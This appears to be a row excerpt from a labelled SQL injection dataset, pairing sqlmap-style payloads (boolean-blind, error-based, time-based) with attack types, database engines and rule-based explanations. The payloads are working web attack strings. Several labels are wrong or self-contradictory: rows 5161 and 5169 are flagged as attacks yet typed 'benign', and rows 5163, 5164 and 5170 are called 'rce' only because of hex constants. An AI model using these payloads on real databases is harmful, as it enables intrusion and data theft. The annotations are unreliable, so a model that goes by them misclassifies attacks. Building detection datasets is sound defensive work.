row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5160,"1 ) ) as sxhg where 7697 = 7697 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,7697 = 7697 or detected — boolean_blind injection (priority 8) on generic,rule-based
5161,1' in boolean mode ) and 5725 = 5552#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5162,1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
5163,"1"" ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ""nzhj"" like ""nzhj",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
5164,"1%' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
5165,1'|| ( select 'ucxp' where 6612 = 6612 order by 1--,1,,boolean_blind,generic,0.95,6612 = 6612 or detected — boolean_blind injection (priority 8) on generic,rule-based
5166,"-3452%' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
5167,"1 ) where 4226 = 4226 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5168,"1"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""vhmc"" = ""vhmc",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5169,"1%"" and make_set ( 8403 = 8403,8899 ) and ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5170,"1"" ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ""ijop"" = ""ijop",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
